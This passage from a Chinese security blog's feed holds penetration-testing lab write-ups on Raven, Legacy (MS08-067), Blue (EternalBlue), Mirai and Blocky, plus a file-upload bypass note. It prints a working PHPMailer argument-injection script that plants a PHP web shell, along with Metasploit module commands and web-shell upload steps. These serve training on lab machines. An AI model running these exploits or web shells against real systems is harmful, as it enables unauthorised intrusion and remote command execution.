href="http://raven.local/vendor/security.md">http://raven.local/vendor/security.md</a> 暗示了phpmailer插件版本漏洞</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">touch <span class="hljs-keyword">test</span>.rc<br><br><span class="hljs-keyword">use</span> exploit/multi/http/phpmailer_arg_injection<br><span class="hljs-keyword">set</span> RHOST 192.168.241.128<br><span class="hljs-keyword">set</span> TARGETURI /contact.php<br><span class="hljs-keyword">set</span> WEB_ROOT /<span class="hljs-keyword">var</span>/www/html/<br><span class="hljs-keyword">run</span><br><br>msfconsole -r <span class="hljs-keyword">test</span>.rc<br>反弹<span class="hljs-keyword">shell</span>失败。。。<br></code></pre></div></td></tr></table></figure><h2 id="exp-sh"><a href="#exp-sh" class="headerlink" title="exp.sh"></a>exp.sh</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>TARGET=http://raven.local/contact.php<br><br>DOCROOT=/var/www/html<br>FILENAME=backdoor.php<br>LOCATION=<span class="hljs-variable">$DOCROOT</span>/<span class="hljs-variable">$FILENAME</span><br><br>STATUS=$(curl -s \<br>              --data-urlencode <span class="hljs-string">&quot;name=Hackerman&quot;</span> \<br>              --data-urlencode <span class="hljs-string">&quot;email=\&quot;hackerman\\\&quot; -oQ/tmp -X<span class="hljs-variable">$LOCATION</span> blah\&quot;@badguy.com&quot;</span> \<br>              --data-urlencode <span class="hljs-string">&quot;message=&lt;?php echo shell_exec(\$_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span> \<br>              --data-urlencode <span class="hljs-string">&quot;action=submit&quot;</span> \<br>              <span class="hljs-variable">$TARGET</span> | sed -r <span class="hljs-string">&#x27;146!d&#x27;</span>)<br><br><span class="hljs-keyword">if</span> grep <span class="hljs-string">&#x27;instantiate&#x27;</span> &amp;&gt;/dev/null &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$STATUS</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Check <span class="hljs-variable">$&#123;LOCATION&#125;</span>?cmd=[shell command, e.g. id]&quot;</span><br><span class="hljs-keyword">else</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[!] Exploit failed&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></div></td></tr></table></figure><p>运行以上exp，成功获得一个webshell，权限为www-data</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-01/2.PNG" alt="2"></p><p>接下来用php反弹shell，如同<a href="https://whale3070.github.io/training/2018/11/10/x/">这篇文章</a></p><p>python -c ‘import pty; pty.spawn(“/bin/bash”)’</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-01/3.PNG" alt="3"></p><p>之后，web目录泄露mysql密码，得到mysql普通权限。<br>然后上传udf源代码，执行安装，就可以使用do_system()函数，以root权限执行命令。<br><a href="https://whale3070.github.io/training/2018/12/11/x/">https://whale3070.github.io/training/2018/12/11/x/</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前用searchsploit 找到了关于phpmailer的exp，php、bash、python的exp，都执行失败了。</p><p>看到过一个问题，<strong>web渗透该如何继续提升？</strong>除非遇到一样的web站点，该搞不下来的网站，还是搞不下来。</p><p>我认为应该用代码能力，写工具，尽可能扩大目标攻击面（只有知道，才能看到弱点），然后精力放在漏洞挖掘上。</p><p>而不是脚本小子运用已知exp对漏洞进行利用。</p><p>就好像我知道锁A、B、C，我有钥匙a，刚好Aa能配上，我就能进入系统。</p><p>经过验证，搞不下来的站点，除非有0day漏洞，那就证明了该站点很安全。</p><p>继续提升代码能力以及漏洞挖掘能力吧…</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>linux os</tag>
      
      <tag>cms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ms08-067</title>
    <link href="/2019/01/29/x/"/>
    <url>/2019/01/29/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.4</p><h2 id="masscan-nmap"><a href="#masscan-nmap" class="headerlink" title="masscan + nmap"></a>masscan + nmap</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">139</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.4</span>                                     <br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">137</span>/udp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.4</span>                                     <br><span class="hljs-attribute">Discovered</span> open port <span class="hljs-number">445</span>/tcp <span class="hljs-literal">on</span> <span class="hljs-number">10.10.10.4</span>                                     <br></code></pre></div></td></tr></table></figure><hr><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">PORT</span>    <span class="hljs-string">STATE</span>    <span class="hljs-string">SERVICE</span>      <span class="hljs-string">VERSION</span><br><span class="hljs-number">137</span><span class="hljs-string">/tcp</span> <span class="hljs-string">filtered</span> <span class="hljs-string">netbios-ns</span><br><span class="hljs-number">139</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>     <span class="hljs-string">netbios-ssn</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span><br><span class="hljs-number">445</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>     <span class="hljs-string">microsoft-ds</span> <span class="hljs-string">Windows</span> <span class="hljs-string">XP</span> <span class="hljs-string">microsoft-ds</span><br><span class="hljs-attr">Service Info: OSs:</span> <span class="hljs-string">Windows,</span> <span class="hljs-string">Windows</span> <span class="hljs-string">XP;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows,</span> <span class="hljs-string">cpe:/o:microsoft:windows_xp</span><br><br><span class="hljs-attr">Host script results:</span><br><span class="hljs-string">|_clock-skew:</span> <span class="hljs-attr">mean:</span> <span class="hljs-string">-4h04m52s,</span> <span class="hljs-attr">deviation:</span> <span class="hljs-string">1h24m49s,</span> <span class="hljs-attr">median:</span> <span class="hljs-string">-5h04m51s</span><br><span class="hljs-string">|_nbstat:</span> <span class="hljs-attr">NetBIOS name:</span> <span class="hljs-string">LEGACY,</span> <span class="hljs-attr">NetBIOS user:</span> <span class="hljs-string">&lt;unknown&gt;,</span> <span class="hljs-attr">NetBIOS MAC:</span> <span class="hljs-number">00</span><span class="hljs-string">:50:56:a4:e1:e1</span> <span class="hljs-string">(VMware)</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-os-discovery:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows</span> <span class="hljs-string">XP</span> <span class="hljs-string">(Windows</span> <span class="hljs-number">2000 </span><span class="hljs-string">LAN</span> <span class="hljs-string">Manager)</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">OS CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows_xp::-</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Computer name:</span> <span class="hljs-string">legacy</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">NetBIOS computer name:</span> <span class="hljs-string">LEGACY\x00</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">Workgroup:</span> <span class="hljs-string">HTB\x00</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">System time:</span> <span class="hljs-number">2019-01-29T11:51:37+02:00</span><br><span class="hljs-string">|</span> <span class="hljs-attr">smb-security-mode:</span> <br><span class="hljs-string">|</span>   <span class="hljs-attr">account_used:</span> <span class="hljs-string">guest</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">authentication_level:</span> <span class="hljs-string">user</span><br><span class="hljs-string">|</span>   <span class="hljs-attr">challenge_response:</span> <span class="hljs-string">supported</span><br><span class="hljs-string">|_</span>  <span class="hljs-attr">message_signing:</span> <span class="hljs-string">disabled</span> <span class="hljs-string">(dangerous,</span> <span class="hljs-string">but</span> <span class="hljs-string">default)</span><br><span class="hljs-string">|_smb2-time:</span> <span class="hljs-string">Protocol</span> <span class="hljs-string">negotiation</span> <span class="hljs-string">failed</span> <span class="hljs-string">(SMB2)</span><br><br><span class="hljs-string">Service</span> <span class="hljs-string">detection</span> <span class="hljs-string">performed.</span> <span class="hljs-string">Please</span> <span class="hljs-string">report</span> <span class="hljs-string">any</span> <span class="hljs-string">incorrect</span> <span class="hljs-string">results</span> <span class="hljs-string">at</span> <span class="hljs-string">https://nmap.org/submit/</span> <span class="hljs-string">.</span><br><span class="hljs-attr">Nmap done:</span> <span class="hljs-number">1</span> <span class="hljs-string">IP</span> <span class="hljs-string">address</span> <span class="hljs-string">(1</span> <span class="hljs-string">host</span> <span class="hljs-string">up)</span> <span class="hljs-string">scanned</span> <span class="hljs-string">in</span> <span class="hljs-number">264.20</span> <span class="hljs-string">seconds</span><br><span class="hljs-string">Starting</span> <span class="hljs-string">Nmap</span> <span class="hljs-number">7.70</span> <span class="hljs-string">(</span> <span class="hljs-string">https://nmap.org</span> <span class="hljs-string">)</span> <span class="hljs-string">at</span> <span class="hljs-number">2019-01-29 </span><span class="hljs-number">21</span><span class="hljs-string">:00</span> <span class="hljs-string">+08</span><br><span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.4</span><br><span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.32s</span> <span class="hljs-string">latency).</span><br><br><span class="hljs-string">PORT</span>    <span class="hljs-string">STATE</span>         <span class="hljs-string">SERVICE</span>      <span class="hljs-string">VERSION</span><br><span class="hljs-number">137</span><span class="hljs-string">/udp</span> <span class="hljs-string">open</span>          <span class="hljs-string">netbios-ns</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ns</span> <span class="hljs-string">(workgroup:</span> <span class="hljs-string">HTB)</span><br><span class="hljs-number">139</span><span class="hljs-string">/udp</span> <span class="hljs-string">open|filtered</span> <span class="hljs-string">netbios-ssn</span><br><span class="hljs-number">445</span><span class="hljs-string">/udp</span> <span class="hljs-string">open|filtered</span> <span class="hljs-string">microsoft-ds</span><br><span class="hljs-attr">Service Info: Host:</span> <span class="hljs-string">LEGACY;</span> <span class="hljs-attr">OS:</span> <span class="hljs-string">Windows;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:microsoft:windows</span><br></code></pre></div></td></tr></table></figure><h2 id="nessus"><a href="#nessus" class="headerlink" title="nessus"></a>nessus</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-29/1.PNG" alt="1"></p><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">msfconsole</span><br><span class="hljs-attribute">search</span> ms<span class="hljs-number">08</span>-<span class="hljs-number">067</span><br><span class="hljs-attribute">use</span> exploit/windows/smb/ms<span class="hljs-number">08</span>_<span class="hljs-number">067</span>_netapi<br></code></pre></div></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><a href="https://whale3070.github.io/training/2019/01/22/x/">和永恒之蓝类似</a></p><p>很简单的得到了administrator权限。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>永恒之蓝</title>
    <link href="/2019/01/22/x/"/>
    <url>/2019/01/22/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.40</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">135/tcp   <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC<br>139/tcp   <span class="hljs-keyword">open</span>  netbios-ssn  Microsoft Windows netbios-ssn<br>445/tcp   <span class="hljs-keyword">open</span>  microsoft-<span class="hljs-keyword">ds</span> Windows 7 Professional 7601 Service Pack 1 microsoft-<span class="hljs-keyword">ds</span> (workgroup: WORKGROUP)<br>49152/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC<br>49153/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC<br>49154/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC<br>49155/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC<br>49156/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC<br>49157/tcp <span class="hljs-keyword">open</span>  msrpc        Microsoft Windows RPC<br><br></code></pre></div></td></tr></table></figure><p>OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</p><p>139、445，很眼熟，于是用nessus扫描一下，是不是永恒之蓝等类似漏洞。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-22/2.PNG" alt="2"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-22/1.PNG" alt="1"></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploit/windows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue 失败<br><span class="hljs-attribute">use</span> exploit/windows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span><br><span class="hljs-attribute">sysinfo</span><br><span class="hljs-attribute">getuid</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-22/3.PNG" alt="3"><br>运行后直接是最高权限。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mirai（物联网设备默认密码）</title>
    <link href="/2019/01/21/x/"/>
    <url>/2019/01/21/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.48</p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">PORT   STATE SERVICE VERSION<br><span class="hljs-number">53</span>/tcp <span class="hljs-keyword">open</span>  domain  dnsmasq <span class="hljs-number">2.76</span><br>| dns-nsid: <br>|_  bind.<span class="hljs-keyword">version</span>: dnsmasq-<span class="hljs-number">2.76</span><br><br>Service detection performed. Please report any incorrect results at http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">16.58</span> seconds<br>Starting Nmap <span class="hljs-number">7.70</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2019</span>-<span class="hljs-number">01</span>-<span class="hljs-number">20</span> <span class="hljs-number">11</span>:<span class="hljs-number">05</span> +<span class="hljs-number">08</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.48</span><br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span>.<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">53</span>/udp <span class="hljs-keyword">open</span>  domain  dnsmasq <span class="hljs-number">2.76</span><br>| dns-nsid: <br>|_  bind.<span class="hljs-keyword">version</span>: dnsmasq-<span class="hljs-number">2.76</span><br></code></pre></div></td></tr></table></figure><ul><li>开放了什么服务？域名服务</li><li>可能有什么漏洞？版本漏洞</li><li>检查和结果：<br>searchsploit dnsmasq<br>小于2.78，有多个dos漏洞的exp。<br>暂时无思路</li></ul><h2 id="再次扫描"><a href="#再次扫描" class="headerlink" title="再次扫描"></a>再次扫描</h2><ul><li><p><code>nmap -O 10.10.10.48</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh<br><span class="hljs-number">53</span>/tcp <span class="hljs-built_in">open</span>  domain<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span><br></code></pre></div></td></tr></table></figure></li><li><p><code>nmap -sV -p 22,80 10.10.10.48</code></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">6</span>.<span class="hljs-number">7</span>p<span class="hljs-number">1</span> Debian <span class="hljs-number">5</span>+deb<span class="hljs-number">8</span>u<span class="hljs-number">3</span> (protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp open  http    lighttpd <span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">35</span><br></code></pre></div></td></tr></table></figure></li><li><p>猜测：os: debian linux</p></li><li><p>可能有什么漏洞？版本漏洞、弱口令</p></li><li><p>执行的命令：<br>searchsploit -m exploits/linux/remote/31396.txt</p></li><li><p>检查和结果：<br>Lighttpd 1.4.x，信息泄露，exploits/linux/remote/31396.txt<br><a href="http://10.10.10.48/~nobody/etc/passwd%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B8%BA%E7%A9%BA%E7%99%BD">http://10.10.10.48/~nobody/etc/passwd，访问为空白</a></p></li><li><p>目录扫描：</p></li></ul><p>10.10.10.48/versions/<br>OIevRH8M.bin   获得了一个二进制文件</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">OIevRH8M.bin: ASCII <span class="hljs-type">text</span>, <span class="hljs-keyword">with</span> <span class="hljs-keyword">no</span> <span class="hljs-type">line</span> terminators<br><span class="hljs-number">1547954147</span>,,, 文件内容,疑似口令，用ssh root和pohole登陆，无结果<br>                尝试登陆后台无结果，爆破<span class="hljs-number">500</span>条用户密码无结果<br>http://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.48</span>/<span class="hljs-keyword">admin</span>/<br>获得一个后台<br></code></pre></div></td></tr></table></figure><ul><li><p>检查web cms<br>Pi-hole Version v3.1.4 Web Interface Version v3.1 FTL Version v2.10<br>未发现可用exp</p></li><li><p>用burp scanner扫描一下web漏洞</p></li><li><p>nikto扫描一些中间件<br>该服务器是DNS服务器，pi-hole是python写的</p></li></ul><h2 id="第三次扫描"><a href="#第三次扫描" class="headerlink" title="第三次扫描"></a>第三次扫描</h2><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">22,53,80省略。。。<br>1636/tcp  open  <span class="hljs-built_in"> upnp </span>   Platinum<span class="hljs-built_in"> UPnP </span>1.0.5.13 (UPnP/1.0 DLNADOC/1.50)<br>32400/tcp open   http    Plex Media<span class="hljs-built_in"> Server </span>httpd<br>| http-auth: <br>| HTTP/1.1 401 Unauthorized\x0D<br>|_ <span class="hljs-built_in"> Server </span>returned status 401 but <span class="hljs-literal">no</span> WWW-Authenticate header.<br>|_http-cors: HEAD <span class="hljs-builtin-name">GET</span> POST PUT DELETE OPTIONS<br>|_http-title: Unauthorized<br>32469/tcp open  <span class="hljs-built_in"> upnp </span>   Platinum<span class="hljs-built_in"> UPnP </span>1.0.5.13 (UPnP/1.0 DLNADOC/1.50)<span class="hljs-built_in"></span><br><span class="hljs-built_in">Service </span>Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></div></td></tr></table></figure><ul><li><p>检查1636，</p></li><li><p>检查32400/Plex Media Server，X-Plex-Version=3.9.1<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-21/4.PNG" alt="4"><br><a href="http://10.10.10.48:32400/">http://10.10.10.48:32400</a><br>没有检查出具体漏洞</p></li><li><p>32469/Platinum UPnP<br>没有检查出具体漏洞</p></li></ul><hr><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-21/5.PNG" alt="5"></p><p>经过信息搜集，发现是树莓派设备上安装的服务。用默认密码，ssh登陆。sudo su，即可获得root权限。</p><p>在检查root.txt中，发现有个提示</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">Damnit! Sorry man I accidentally deleted your files <span class="hljs-keyword">off</span> the USB stick.<br><span class="hljs-keyword">Do</span> you know <span class="hljs-keyword">if</span> there <span class="hljs-keyword">is</span> <span class="hljs-keyword">any</span> way <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> them back?<br><br>-James<br></code></pre></div></td></tr></table></figure><p>说root.txt被删除了。</p><p>用strings命令，可以检查这个分区中所有的字符串。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为一开始，攻击向量找错了，一直往有漏洞的服务或者弱口令爆破上面去想，所以一直没有收获。</p><p>strings这个命令，以前用过，只知道可以检查可执行文件中的字符串。没想到还可以检查硬盘分区中的字符串。。。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>weak password</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web常见漏洞--文件上传</title>
    <link href="/2019/01/20/x/"/>
    <url>/2019/01/20/x/</url>
    
    <content type="html"><![CDATA[<p>参考资料： <a href="https://www.cnblogs.com/milantgh/p/3601724.html">https://www.cnblogs.com/milantgh/p/3601724.html</a><br><a href="https://www.waitalone.cn/bypassing-the-file-upload-validation.html">https://www.waitalone.cn/bypassing-the-file-upload-validation.html</a></p><p>上一篇：<a href="https://whale3070.github.io/web/2018/11/18/x/">常见web漏洞-command execution</a></p><hr><p>第一个直接上传，什么都没限制</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-20/3.PNG" alt="3"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-20/1.PNG" alt="1"></p><hr><p>第二个，传php，会提示no PHP</p><ol><li><p>传jpg，正常上传</p></li><li><p>于是burp抓包，先传一个jpg，然后将图片内容全部删除，替换为php一句话；将后缀添加<code>.php</code></p></li></ol><p>依然提示no PHP</p><ol start="3"><li>于是大小写绕过一下，成功绕过。说明是基于正则表达式的匹配。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-20/2.PNG" alt="2"></li></ol><hr><p>第三个案例，真实环境</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-20/Screenshot%20from%202019-01-20%2010-09-39.png" alt="Screenshot from 2019-01-20 10-09-39"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-20/Screenshot%20from%202019-01-20%2010-13-20.png" alt="Screenshot from 2019-01-20 10-13-20"><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-20/Screenshot%20from%202019-01-20%2010-14-13.png" alt="Screenshot from 2019-01-20 10-14-13"><br>修改filename，后缀为aspx，将图片内容替换为脚本</p><p>kali中可用的脚本地址为：<code>/usr/share/webshells/aspx/cmdasp.aspx</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-20/%E6%88%AA%E5%9B%BE1.PNG" alt="截图1"></p><p>就可以执行cmd命令。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Blocky（源码泄露、java反编译）</title>
    <link href="/2019/01/19/x/"/>
    <url>/2019/01/19/x/</url>
    
    <content type="html"><![CDATA[<p>10.10.10.37 </p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">21</span>/tcp    open  ftp       ProFTPD <span class="hljs-number">1</span>.<span class="hljs-number">3</span>.<span class="hljs-number">5</span>a<br><span class="hljs-attribute">22</span>/tcp    open  ssh       OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">2</span>p<span class="hljs-number">2</span> Ubuntu <span class="hljs-number">4</span>ubuntu<span class="hljs-number">2</span>.<span class="hljs-number">2</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp    open  http      Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">18</span> ((Ubuntu))<br><span class="hljs-attribute">25565</span>/tcp open  minecraft Minecraft <span class="hljs-number">1</span>.<span class="hljs-number">11</span>.<span class="hljs-number">2</span> (Protocol: <span class="hljs-number">127</span>, Message: A Minecraft Server, Users: <span class="hljs-number">0</span>/<span class="hljs-number">20</span>)<br></code></pre></div></td></tr></table></figure><hr><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">ftp <span class="hljs-number">10.10</span>.<span class="hljs-number">10.37</span><br><br>searchsploit ProFTPD<br>ProFTPd <span class="hljs-number">1.3</span>.<span class="hljs-number">5</span> - <span 